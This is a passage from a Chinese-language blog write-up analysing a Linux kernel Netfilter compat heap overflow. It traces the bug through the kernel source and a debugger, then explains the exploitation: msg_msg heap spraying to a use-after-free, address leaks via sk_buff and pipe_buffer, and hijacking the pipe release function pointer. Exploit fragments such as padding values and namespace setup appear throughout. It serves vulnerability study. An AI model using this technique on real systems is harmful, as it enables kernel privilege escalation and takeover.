<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(iter0, &amp;pos, &amp;size,</span><br><span class="line">					    newinfo, entry1);</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="5-compat-copy-entry-from-user"   >
          <a href="#5-compat-copy-entry-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-compat-copy-entry-from-user" class="headerlink" title="5.compat_copy_entry_from_user()"></a>5.compat_copy_entry_from_user()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">			    <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">			    struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：不太清楚</p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="comment">//即保存pos的栈地址，值为newinfo-&gt;entries(newinfo_addr+0x40)</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>相关操作：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">compat_copy_entry_from_user(struct compat_ipt_entry *e, <span class="keyword">void</span> **dstptr,</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> *size,</span><br><span class="line">                            struct xt_table_info *newinfo, <span class="keyword">unsigned</span> <span class="keyword">char</span> *base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//即pos加上0x70，值为newinfo_addr+0x40+0x70</span></span><br><span class="line">    *dstptr += <span class="keyword">sizeof</span>(struct ipt_entry);</span><br><span class="line">    *size += <span class="keyword">sizeof</span>(struct ipt_entry) - <span class="keyword">sizeof</span>(struct compat_ipt_entry);</span><br><span class="line">    xt_ematch_foreach(ematch, e)</span><br><span class="line">		xt_compat_match_from_user(ematch, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    xt_compat_target_from_user(t, dstptr, size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="6-xt-compat-match-from-user"   >
          <a href="#6-xt-compat-match-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-match-from-user" class="headerlink" title="6.xt_compat_match_from_user()"></a>6.xt_compat_match_from_user()</h2>
      <p>这个函数和接下来的漏洞函数<code>xt_compat_target_from_user</code>可以说基本一致，观察下图即可看到，具体用来干什么不太清楚，但是作用也是相关的pad填充<code>newinfo</code>上的数据。打了一个循环<code>xt_ematch_foreach</code>，在我们关注的这个漏洞里，其作用就只是使得<code>*dstptr + n * msize</code>，也就是在我们关心的最终值为<code>newinfo_addr+0x40+0x70+n * msize</code>，从而使得在进入<code>xt_compat_target_from_user</code>之前，<code>*dstptr</code>上的堆块地址已经移动到末尾了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png" alt="image-20220507214923917" style="zoom: 80%;" />        <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png" alt="image-20220507214947982" style="zoom: 80%;" /></p>
<p>做了一个数据对比：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newinfo：				0xffff888006a2a000</span><br><span class="line">t：						0xffff888006a2afda</span><br><span class="line">t-&gt;data：				0xffff888006a2affa</span><br><span class="line">target-&gt;targetsize：		0x4</span><br><span class="line">dstptr：</span><br><span class="line">	xt_compat_match_from_user的时候：</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2a0b0</span><br><span class="line">	xt_compat_target_from_user的时候：</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2afda</span><br></pre></td></tr></table></div></figure>

<p>也就是说经过<code>xt_compat_match_from_user</code>函数之后，保存在<code>*dstptr</code>上的漏洞堆的地址已经加上了<code>0xf2a</code>。</p>

        <h2 id="6-xt-compat-target-from-user"   >
          <a href="#6-xt-compat-target-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-target-from-user" class="headerlink" title="6.xt_compat_target_from_user()"></a>6.xt_compat_target_from_user()</h2>
      <p>终于来到最后的漏洞函数</p>
<ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xFFFFFFFF81A82F75</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> *<span class="title">t</span>;</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br></pre></td></tr></table></div></figure></li>
<li><p>相关操作：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xt_compat_target_from_user</span><span class="params">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line">	<span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//即获取指针为newinfo+0x40+0x70+0xf2a</span></span><br><span class="line">	t = *dstptr;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//进行8字节对齐</span></span><br><span class="line">	pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	<span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//target-&gt;targetsize为4，则最终传入的地址为</span></span><br><span class="line">        <span class="comment">//newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe</span></span><br><span class="line">        <span class="comment">//同时pad在经过对齐之后也为4,那么就溢出2个字节</span></span><br><span class="line">		<span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="总结-1"   >
          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
      <p>通过上述分析可以看到，其实该漏洞的成因就是</p>

        <h3 id="1-控制堆块大小和偏移"   >
          <a href="#1-控制堆块大小和偏移" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-控制堆块大小和偏移" class="headerlink" title="(1)控制堆块大小和偏移"></a>(1)控制堆块大小和偏移</h3>
      <p>通过控制传入的<code>&amp;data</code>中的<code>pad</code>的大小来控制申请的堆块的大小和<code>t-&gt;data</code>的相对偏移地址</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>         <span class="comment">// 0x60</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>            <span class="comment">// 0x70</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>         <span class="comment">// 0x20</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];     </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>      <span class="comment">// 0x20</span></span><br><span class="line">&#125; data = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></div></figure>

<p>例子：</p>
<p>比如bsauce师傅提供的EXP中的pad如下，这里使用的是<code>kmalloc-4096</code>：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>那么我们尝试使用<code>kmalloc-2048</code>，在代码中减去0x800得到如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> - <span class="number">0x800</span>];</span><br></pre></td></tr></table></div></figure>

<p>断点打在<code>xt_alloc_table_info</code>，在第二次的<code>xt_alloc_table_info</code>申请漏洞堆块处，查看下CPU0的<code>kmalloc-2048</code>中<code>freelist</code>中的堆块。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png" alt="image-20220508200120767"></p>
<p>然后<code>finish</code>当前函数，查看rax申请到的堆块，即为<code>freelist</code>中的第一个堆块</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png" alt="image-20220508200155851"></p>
<p>可以看到是从CP0的<code>kmalloc-2048</code>中申请得到的，之后在<code>call memset</code>的漏洞点打下断点，按c继续运行，断下来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png" alt="image-20220508200407354"></p>
<p>可以看到仍然还是该漏洞堆块，并且相关的地址也类似的，pad为0x4，所以还是存在漏洞点的。</p>
<p>不过具体的细节有点不太清楚，后续还得补一补<code>Netfilter</code>的相关知识。</p>

        <h3 id="2-控制填充pad"   >
          <a href="#2-控制填充pad" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-控制填充pad" class="headerlink" title="(2)控制填充pad"></a>(2)控制填充pad</h3>
      <p>通过控制传入的<code>data.target.u.user.revision</code>来控制<code>target-&gt;targetsize</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.target.u.user.revision = <span class="number">1</span>;</span><br></pre></td></tr></table></div></figure>

<p>不同的<code>version</code>控制不同的<code>target-&gt;targetsize</code>。</p>
<p>这里经过我自己的实际调试，感觉bsauce师傅说的有点小问题。漏洞点应该是出在上述的<code>t-&gt;daii</code>地址没有0x8对齐的时候，并且<code>target-&gt;size</code>也没有0x8对齐的情况下。</p>
<p>此外，不应该只是2字节溢出，最多应该可以到达4字节溢出，如下设置</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> + <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>这样可以溢出4个字节写0，最终效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png" alt="image-20220508204003227"></p>
<p>如果再加pad的话就会导致申请出<code>kmalloc-8192</code>的堆块了</p>

        <h1 id="二、漏洞利用"   >
          <a href="#二、漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1>
      
        <h2 id="1-溢出转化UAF"   >
          <a href="#1-溢出转化UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-溢出转化UAF" class="headerlink" title="1.溢出转化UAF"></a>1.溢出转化UAF</h2>
      <p>这里涉及到之前提到的<code>msg_msg</code>结构体利用。</p>

        <h3 id="1-堆喷内存布局"   >
          <a href="#1-堆喷内存布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆喷内存布局" class="headerlink" title="(1)堆喷内存布局"></a>(1)堆喷内存布局</h3>
      <p>首先使用<code>msgget</code>申请多个消息队列，然后往每个消息队列发送两条消息，一条主消息<code>0x1000</code>，一条辅助消息<code>0x400</code>。这里发送消息时需要注意下，先遍历每个队列发送主消息，然后再遍历每个队列发送辅助消息。这样进行堆喷构造后，其中就会有部分的消息队列中的主消息连成一整块地址连续的内存，<strong>辅助消息也需要地址连成一整块，方便后续泄露地址，但是这里为了好看就没有连一起</strong>。比如这里申请三个消息队列，最终形成类似的如下布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png" alt="image-20220513110107919"></p>
<p>当然这里每条<code>0x1000</code>的主消息中还有几个<code>struct msg_msgseg*</code>没有画出来</p>

        <h3 id="2-漏洞溢出构造UAF"   >
          <a href="#2-漏洞溢出构造UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞溢出构造UAF" class="headerlink" title="(2)漏洞溢出构造UAF"></a>(2)漏洞溢出构造UAF</h3>
      <p>这里我们先释放例子中的第二条主消息，虽说在主消息中是由4个<code>kmalloc(0x400)</code>申请出来的4个堆块，但是如果都释放之后，内存的回收机制发现这四个地址连续且都被释放，那么就会归并成一页<code>page</code>还给<code>Slub</code>分配器，其实就是<code>kmalloc-4096</code>。（里面算法很复杂，不是很懂，后面再来理清楚。）之后再申请<code>0x1000</code>大小的堆块，就会优先从这里取。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png" alt="image-20220513110346186"></p>
<p>然后我们使用漏洞，调用<code>socketopt</code>来申请一个<code>0x1000</code>的<code>xt_table_info</code>，就会占据到我们刚刚释放的<code>0x1000</code>大小的堆块上。(这个前面我们分析<code>socketopt</code>会申请两个<code>0x1000</code>大小的堆块，那么我们之后就是多释放几条主消息即可)这样在占据之后，发生2字节溢出写0，就可以溢出到下一个消息队列的<code>msg_msg</code>头部结构的<code>struct list_head m_list.next</code>指针，从而使得其指向其他位置，如果运气好的话，由于辅助消息也是堆喷形式，且大小为<code>0x400</code>，那么溢出两字节写0就可能将该<code>next</code>指针指向其他的辅助消息，从而造成两个消息队列中共存一个辅助消息。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png" alt="image-20220513110927931"></p>
<p>比如图中消息队列3中的主消息头部的<code>struct list_head m_list.next</code>即被修改(黑色为溢出2字节写0)，如红色箭头所示指向了消息队列1中的辅助消息，这样消息队列1和消息队列3都指向了同一个辅助消息，构成了堆块<code>overlap</code>。之后我们释放消息队列1中的辅助消息，而消息队列3仍然指向该辅助消息，构成了UAF。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png"></p>
<p>🔺注：在实际的利用里，需要进行堆喷布局，申请很多的消息队列，这时候就需要用<code>MSG_COPY</code>标志位来进行消息读取。利用此标志位读取消息但不释放堆块，然后借助发送消息时自己留下的索引标志来判断到底是哪个辅助消息被两个消息队列所包含，这样就能进行后续的利用。</p>

        <h2 id="2-利用UAF"   >
          <a href="#2-利用UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用UAF" class="headerlink" title="2.利用UAF"></a>2.利用UAF</h2>
      
        <h3 id="1-泄露堆地址"   >
          <a href="#1-泄露堆地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露堆地址" class="headerlink" title="(1)泄露堆地址"></a>(1)泄露堆地址</h3>
      <p>首先使用<code>sk_buff</code>的<code>data</code>数据块来占据该<code>UAF</code>堆块。前面提到<code>sk_buff</code>的结构头使用独有的缓冲池<code>kache</code>来申请，但是其<code>data</code>数据块还是使用<code>kmalloc</code>常规路线来申请释放(使用正常的发包收包即可完成申请释放)，并且<code>size</code>和<code>data</code>内容完全可控，这样我们就可以完全控制该<code>UAF</code>堆块。</p>
<p>之后伪造一个<code>fake_msg_msg</code>结构体，结构如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png" alt="image-20220513112451162"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>改大其<code>m_ts</code>域，就可以读取出消息队列2的辅助消息头部指针<code>struct list_head m_list.next</code>的值，从而泄露消息队列2的<code>msg_msg_queue</code>的<code>struct list_head m_list</code>域的地址，为一个堆地址。</p>
<p>之后我们修改<code>fake_msg_msg</code>的<code>struct msg_msgseg *next</code>指针，指向上述获得的消息队列2的<code>struct list_head m_list</code>域的地址，就能读出该<code>struct list_head m_list</code>域的<code>prev</code>指针，即为消息队列2的辅助消息的地址，减去<code>0x400</code>即为<code>UAF</code>堆块的地址</p>

        <h3 id="2-泄露内核基地址"   >
          <a href="#2-泄露内核基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-泄露内核基地址" class="headerlink" title="(2)泄露内核基地址"></a>(2)泄露内核基地址</h3>
      <p>接下来利用到<code>pipe</code>管道，主要是其中<code>struct pipe_inode_info</code>的<code>struct pipe_buffer *bufs;</code>数组，总大小为<code>0x280</code>，使用<code>kmalloc-1024</code>，满足当前的<code>UAF</code>（同样使用正常的<code>read/write</code>即可完成申请释放）。其结构为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>利用如下操作读取<code>const struct pipe_buf_operations *ops;</code>指针，即可泄露内核基地址</p>
<ul>
<li>利用 <code>sk_buff</code> 修复<code>UAF</code>处的辅助消息，之后从消息队列中接收该辅助消息，此时该<code>UAF</code>对象重回 <code>slub</code>的<code>kmalloc-1024</code>的<code>freelist</code>中，但 <code>sk_buff</code> 仍指向该<code>UAF</code>对象</li>
<li>喷射 <code>pipe_buffer</code>，就会将该<code>UAF</code>对象申请回来，将<code>pipe_buffer</code>写入到该<code>UAF</code>对象上，之后再接收 <code>sk_buff</code> 数据包，即可获取<code>pipe_buffer</code>上的数据，得到<code>const struct pipe_buf_operations *ops;</code>指针，即可泄露内核基地址</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png" alt="image-20220513115154194"></p>

        <h3 id="3-劫持程序执行流"   >
          <a href="#3-劫持程序执行流" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-劫持程序执行流" class="headerlink" title="(3)劫持程序执行流"></a>(3)劫持程序执行流</h3>
      <p>之前也提到过，当我们关闭管道<code>pipe</code>两端或者从管道<code>pipe</code>中读取出所有数据之后，会调用到<code>pipe_buf_release()</code>函数进行清理，其中会调用<code>struct pipe_buffer *bufs;</code>下的<code>const struct pipe_buf_operations *ops;</code>对应函数表中的<code>release</code>函数指针。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">pipe_buf_release</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct pipe_buffer *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>现在我们就可以通过<code>sk_buff</code>来劫持劫持<code>ops</code>指针函数表，修改其中的<code>release</code>函数指针，完成劫持程序流。并且此时的<code>rsi</code>即为<code>buf</code>为我们的<code>UAF</code>对象，而<code>sk_buff</code>又可以使得<code>UAF</code>对象里的数据完全可控。如果找到一个可以将<code>rsp</code>劫持为<code>rsi</code>的<code>gadget</code>，那么就可以完全操控程序流程了。</p>

        <h2 id="3-EXP解析"   >
          <a href="#3-EXP解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXP解析" class="headerlink" title="3.EXP解析"></a>3.EXP解析</h2>
      <p>这个其实也没有什么好讲的，看懂漏洞利用过程其实也很容易写出来的，主要提一下某些比较偏的知识点，也防止忘记。</p>

        <h3 id="1-绑定CPU分配"   >
          <a href="#1-绑定CPU分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-绑定CPU分配" class="headerlink" title="(1)绑定CPU分配"></a>(1)绑定CPU分配</h3>
      <p>通常是用来进行堆块分配时查看堆块内存的，防止堆块申请的时候东一个西一个的，方便调试，同时也是为了提高堆喷射的稳定性</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bind the cpu0</span></span><br><span class="line"><span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-命名空间"   >
          <a href="#2-命名空间" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-命名空间" class="headerlink" title="(2)命名空间"></a>(2)命名空间</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>EXP</code>原作者称：当<code>IPT_SO_SET_REPLACE</code>或<code>IP6T_SO_SET_REPLACE</code>在兼容模式下被调用时（需要<code>CAP_NET_ADMIN</code>权限）。</p>
<p>这个在源代码<code>do_ipt_set_ctl()</code>函数中有所体现</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_ipt_set_ctl</span><span class="params">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="comment">//提到当兼容模式下需要CAP_NET_ADMIN权限</span></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span 